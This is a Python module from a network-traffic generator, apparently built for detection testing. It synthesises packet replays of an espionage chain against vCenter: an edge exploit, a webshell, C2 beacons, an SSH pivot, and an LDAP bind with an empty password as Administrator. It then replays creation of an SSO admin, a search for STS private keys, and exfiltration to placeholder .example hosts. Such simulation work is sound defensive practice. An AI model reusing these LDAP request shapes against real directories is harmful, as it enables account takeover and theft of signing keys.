"""netgen.armorycastle_vcenter123890 -- the "ARMORY CASTLE vCenter chain (CVE-2026-123890)" replay.

A replay of the espionage chain disclosed with the November 2026 vCenter patch: the actor entered through
the BeyondTrust Remote Support zero-day (the sibling ``beyondtrust102764`` pack), pivoted to a Linux
appliance on the internal network, and then used an authentication bypass in the vCenter Directory Service
(vmdir, LDAP) to create an SSO administrator and read vCenter's secrets -- a backdoor-style tool (BONESAW)
did the account creation and theft.

What a sensor sees (cleartext LDAP on 389 and cleartext-in-record HTTPS, real framing, inert values):
  * the edge appliance exploited (the BeyondTrust pack's own request shapes), then a webshell and a
    C2 beacon, exactly as the sibling replay;
  * the edge appliance SSHing to an internal Linux appliance it has no business reaching, which then
    beacons out on its own;
  * the appliance talking LDAP to the vCenter directory: a simple bind with a DN and an EMPTY password that
    nevertheless succeeds (the bypass), an LDAP ADD of a new SSO user, a MODIFY adding it to Administrators,
    then a large tenant-credential search returning key/certificate-sized attribute values;
  * the new account used immediately: an STS token request and a vSphere SDK login from the appliance;
  * the secrets leaving: a cleartext PUT and a bulk upload to the exfil sink.

Registered as ``ir-armorycastle-vcenter-cve123890`` (category IR), a SIBLING of the other IR replays.

PIN-SAFE: hosts are injected inside ``build()``; a build that does not select this scenario is
byte-for-byte the baseline.
"""
import base64
import os

from netgen import asn1 as A
from netgen import flows as F
from netgen import protocols as P
from netgen.identity import H
from netgen import packkit as K

from netgen.netscaler import phases as NSP
from netgen.netscaler import content
from netgen.netscaler.phases import _https_open, _http_req, _https_msg

from netgen.beyondtrust102764 import (_BTRS_SUFFIX, _WEBSHELL_LOG, _inject_hosts as _bt_hosts,
                                      bt_exploit_read, bt_exploit_write, bt_webshell_cmd)
from netgen.vcenter59310 import (_SOAP_ENV, _SOAP_NS, _VC_SUFFIX, _ESXI, _inject_hosts as _vc_hosts,
                                 _vim25_login_resp, mgmt_heartbeat)

rng = NSP.rng

_APP_SUFFIX, _APP_IP, _APP_MAC = "LNXAPP1", "10.10.20.129", "00:50:56:bb:12:81"
_EXTERNAL = {
    "attacker": ("node123.probe-pool.example", "203.0.113.123", 12),
    "beacon": ("sync.vsphere-telemetry.example", "192.0.2.124", 13),
    "exfil": ("cdn-vsphere-updates.example", "192.0.2.125", 15),
}
_NEW_USER = "svc-backup-admin"
_VMDIR_USERS = "cn=Users,dc=vsphere,dc=local"
_UA_SDK = "VMware vim-sdk/8.0"


# ---- LDAP write operations (RFC 4511) -- the encoders the stock LDAP set does not carry --------------
def _ldap_result(tag, rc=0, matched="", diag=""):
    return A.tlv(tag, A.enum(rc) + A.octets(matched.encode()) + A.octets(diag.encode()))


def ldap_add_request(msgid, dn, attrs):
    """AddRequest [APPLICATION 8]: entry DN + AttributeList."""
    parts = [A.seq(A.octets(k.encode()), A.set_(*[A.octets(v if isinstance(v, bytes) else v.encode()) for v in vals]))
             for k, vals in attrs.items()]
    return P._ldap_msg(msgid, A.tlv(0x68, A.octets(dn.encode()) + A.seq(*parts)))


def ldap_add_response(msgid, rc=0):
    return P._ldap_msg(msgid, _ldap_result(0x69, rc))


def ldap_modify_add(msgid, dn, attr, value):
    """ModifyRequest [APPLICATION 6] with one change: operation add(0) of `attr`=`value`."""
    change = A.seq(A.enum(0), A.seq(A.octets(attr.encode()), A.set_(A.octets(value.encode()))))
    return P._ldap_msg(msgid, A.tlv(0x66, A.octets(dn.encode()) + A.seq(change)))


def ldap_modify_response(msgid, rc=0):
    return P._ldap_msg(msgid, _ldap_result(0x67, rc))


def _b64blob(n):
    return base64.b64encode(os.urandom(n))


def _inject(ctx):
    bt_ext = _bt_hosts(ctx)
    vc_ext = _vc_hosts(ctx)
    app = K.add_internal(ctx, _APP_SUFFIX, _APP_IP, _APP_MAC, "Linux (Ubuntu 22.04 appliance)", "ssh", "monitor")
    ext = K.add_externals(ctx, "_armory_ext", _EXTERNAL, rng)
    return ext, bt_ext, vc_ext, app


def vmdir_takeover(ctx, app, vc, ts=None):
    """One cleartext LDAP 389 connection from the appliance to the vCenter directory: the bypassing bind
    (DN, empty password, accepted), a root-DSE search, the ADD of the new SSO user, the MODIFY into the
    Administrators group, then the tenant-credential search whose values are key/certificate-sized."""
    out = ctx.arp_for(app, vc, ts, vantage=vc)
    s = ctx.tcp(app, vc, 389, ts + 0.001, vantage=vc).handshake()
    mid = 1
    s.c2s(P.ldap_bind_request_simple(mid, "cn=Administrator,cn=Users,dc=vsphere,dc=local", b""), think=0.002)
    s.s2c(NSP._simple_bind_success(mid), think=rng.uniform(0.002, 0.012))
    mid += 1
    s.c2s(P.ldap_search_request(mid, "", 0, P._filter_present("objectClass"), ["namingContexts", "vmwSTSDomain", "supportedLDAPVersion"]),
          think=rng.uniform(0.01, 0.05))
    s.s2c(P.ldap_search_entry(mid, "", {"namingContexts": ["dc=vsphere,dc=local"], "supportedLDAPVersion": ["3"]}) + P.ldap_search_done(mid),
          think=rng.uniform(0.002, 0.01))
    dn = "cn=%s,%s" % (_NEW_USER, _VMDIR_USERS)
    mid += 1
    s.c2s(ldap_add_request(mid, dn, {
        "objectClass": ["top", "person", "organizationalPerson", "user"], "cn": [_NEW_USER], "sn": [_NEW_USER],
        "userPrincipalName": [_NEW_USER + "@vsphere.local"], "userPassword": [base64.b64encode(os.urandom(12))]}),
        think=rng.uniform(0.4, 1.5))
    s.s2c(ldap_add_response(mid), think=rng.uniform(0.01, 0.05))
    mid += 1
    s.c2s(ldap_modify_add(mid, "cn=Administrators,cn=Builtin,dc=vsphere,dc=local", "member", dn), think=rng.uniform(0.3, 1.2))
    s.s2c(ldap_modify_response(mid), think=rng.uniform(0.01, 0.05))
    mid += 1
    tenant = "cn=TenantCredential-1,cn=vsphere.local,cn=Tenants,cn=IdentityManager,cn=Services,dc=vsphere,dc=local"
    s.c2s(P.ldap_search_request(mid, "cn=Tenants,cn=IdentityManager,cn=Services,dc=vsphere,dc=local", 2,
                                P._filter_present("vmwSTSTenantCredential"), ["userCertificate", "vmwSTSPrivateKey", "vmwSTSTenantKey"]),
          think=rng.uniform(1.0, 3.0))
    entries = b"".join(P.ldap_search_entry(mid, tenant.replace("-1", "-%d" % i), {
        "userCertificate": [_b64blob(1600)], "vmwSTSPrivateKey": [_b64blob(2300)], "vmwSTSTenantKey": [_b64blob(1100)]}) for i in (1, 2))
    s.s2c(entries + P.ldap_search_done(mid), think=rng.uniform(0.02, 0.1))
    mid += 1
    s.c2s(P.ldap_unbind(mid), think=rng.uniform(0.05, 0.4))
    return F.merged(out, s.close(think=0.002))


def sso_admin_login(ctx, app, vc, ts=None):
    """The new account used at once: an STS token request (WS-Trust, UsernameToken) then a vSphere SDK login,
    both from the appliance (cleartext in the TLS record)."""
    host = "%s:443" % vc.ip
    s = _https_open(ctx, app, vc, ts, "openssl", sni=vc.fqdn, vantage=vc)
    rst = ('<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body>'
           '<wst:RequestSecurityToken xmlns:wst="http://docs.oasis-open.org/ws-sx/ws-trust/200512"><wst:TokenType>'
           'urn:oasis:names:tc:SAML:2.0:assertion</wst:TokenType><wst:RequestType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/Issue'
           '</wst:RequestType></wst:RequestSecurityToken></soapenv:Body></soapenv:Envelope>').encode()
    req = _http_req("POST", "/sts/STSService/vsphere.local", host, _UA_SDK,
                    extra=["Content-Type: text/xml; charset=utf-8", 'SOAPAction: "http://docs.oasis-open.org/ws-sx/ws-trust/200512/RST/Issue"'],
                    body=rst)
    _https_msg(s, req, P.http_response("200 OK", content.xml_doc("RequestSecurityTokenResponse", 3400, vc.fqdn), "text/xml", s.t, server="VMware"))
    login = _http_req("POST", "/sdk", host, _UA_SDK,
                      extra=["Content-Type: text/xml; charset=utf-8", 'SOAPAction: "%s"' % _SOAP_NS],
                      body=(_SOAP_ENV % ('<vim25:Login><_this type="SessionManager">SessionManager</_this><userName>%s@vsphere.local</userName></vim25:Login>' % _NEW_USER)).encode())
    _https_msg(s, login, P.http_response("200 OK", _vim25_login_resp(680), "text/xml", s.t, server="VMware"))
    return F.merged(s._ns_pre, s.close(think=rng.uniform(0.05, 0.3)))


def build(ctx, eng, tag, win):
    """Schedule the ARMORY CASTLE chain: BeyondTrust exploit + webshell + beacon -> SSH pivot to an internal
    appliance + its own beacon -> vmdir bypass, SSO admin creation, secrets read -> SSO admin login ->
    secrets exfil. vCenter/ESXi management heartbeats and ordinary vSphere Client visits run alongside."""
    ext, bt_ext, vc_ext, app = _inject(ctx)
    from netgen import incidents as INC
    s = INC.sched_factory(eng, ctx, tag, win)
    lo, hi = win
    scale = max(0.01, min(1.0, getattr(ctx, "scale", 1.0)))
    bt = ctx.h[K.host_name(_BTRS_SUFFIX)]
    vc = ctx.h[K.host_name(_VC_SUFFIX)]
    esxis = [ctx.h[K.host_name(suf)] for suf, _ip, _mac in _ESXI if K.host_name(suf) in ctx.h]
    dc1 = ctx.h.get(H("DC1"))
    atk, beacon, exfil = ext["attacker"], ext["beacon"], ext["exfil"]

    # ---- Stage 1: the edge appliance (BeyondTrust shapes), webshell, outbound beacon ----
    s(lo + 14, bt_exploit_read, atk, bt)
    s(lo + 30, bt_exploit_write, atk, bt)
    for off, cmd in _WEBSHELL_LOG:
        s(lo + 90 + off, bt_webshell_cmd, atk, bt, cmd)
    t, counter = lo + 900, 1
    while t < hi:
        s(t, NSP.c2_beacon, bt, beacon, counter)
        counter += 1
        t += rng.uniform(60, 100)

    # ---- Stage 2: SSH pivot to the internal Linux appliance, which then beacons on its own ----
    s(lo + 1500, NSP.ssh_test, bt, app, cbanner=b"SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5\r\n")
    if dc1 is not None:
        s(lo + 1620, NSP.c2_dns, app, dc1, "sync.vsphere-telemetry.example")
    t, counter = lo + 1700, 1
    while t < hi:
        s(t, NSP.c2_beacon, app, beacon, counter)
        counter += 1
        t += rng.uniform(70, 110)

    # ---- Stage 3: vmdir bypass, SSO admin creation, secrets read, then the account in use ----
    s(lo + 2400, vmdir_takeover, app, vc)
    s(lo + 2520, sso_admin_login, app, vc)

    # ---- Stage 4: the secrets leave ----
    body = (b"# vsphere secrets export\n" + b"\n".join(_b64blob(180) for _ in range(40)))
    s(lo + 2700, NSP.config_exfil, vc, exfil, body, path="/staging/vmdir_export.ldif")
    s(lo + 2760, NSP.data_exfil, vc, exfil, int(24_000_000 * scale), label="vcenter-secrets.tar")

    # ---- benign interleave: vCenter<->ESXi management plane + normal vSphere Client visits ----
    for esxi in esxis:
        t = lo + rng.uniform(0, 60)
        while t < hi:
            s(t, mgmt_heartbeat, vc, esxi)
            t += rng.uniform(55, 65)
    for label in ("A", "B", "C", "D"):
        for _ in range(max(2, int(round(8 * scale)))):
            s(lo + rng.uniform(0, max(1.0, hi - lo - 60)), NSP.portal_browse, vc_ext["wf" + label], vc, label, product="vcenter")
